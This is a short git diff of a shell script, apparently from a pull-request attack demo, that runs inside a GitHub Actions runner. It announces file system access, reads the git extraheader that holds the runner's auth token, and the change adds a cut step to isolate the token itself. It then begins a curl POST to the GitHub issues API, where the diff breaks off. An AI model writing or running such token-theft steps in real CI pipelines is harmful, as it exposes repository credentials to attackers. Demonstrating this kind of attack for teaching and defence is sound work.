@@ -160,7 +160,7 @@ echo We have access to the file system!
 # done
 
 git config --list
-GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader` 
+GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | cut -d' ' -f3`
 GIT_REPO=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get remote.origin.url`
 curl --request POST \
           --url https://api.github.com/repos/gwstudent/pr-demo/issues \
